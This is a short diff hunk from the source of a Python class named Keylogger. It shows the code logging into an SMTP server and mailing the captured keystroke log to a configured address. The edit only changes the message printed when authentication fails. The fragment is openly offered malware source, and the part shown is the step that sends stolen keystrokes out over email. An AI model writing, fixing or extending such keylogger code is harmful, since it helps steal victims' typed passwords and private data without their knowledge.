@@ -44,7 +44,7 @@ class Keylogger:
             server.login(self.email, self.password)
             server.sendmail(self.email, self.email, f"\n\n{self.log}")
         except SMTPAuthenticationError:
-            print("Email sent.")
+            print("Username and Password not accepted.")
         finally:
             server.quit()
 
